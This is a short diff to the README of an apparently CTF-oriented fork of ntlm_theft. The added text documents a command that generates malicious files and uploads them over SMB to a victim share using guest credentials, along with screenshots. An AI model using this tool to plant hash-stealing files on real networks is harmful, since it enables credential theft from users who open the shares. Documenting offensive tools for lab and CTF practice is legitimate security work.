@@ -4,3 +4,13 @@ and upload them to the victim defined by rserver andd rport
 
 
 `python3 ntlm_theft.py --generate all --server 127.0.0.1 --filename 'dekstop' --upload -rserver localhost -rport 445 -smbuser guest -smbpass '' -d ./desktop/`
+
+
+![image](https://github.com/h8handles/ntlm_theftCTF/assets/67421443/53dd92e6-666f-4d55-aadb-06148a327d93)
+
+After normal generation of the malicious files it will take the directory created and upload the files 
+
+
+_List of files Uploaded_
+
+![image](https://github.com/h8handles/ntlm_theftCTF/assets/67421443/94a6a2fe-fa33-4076-b271-de75ae9227d0)
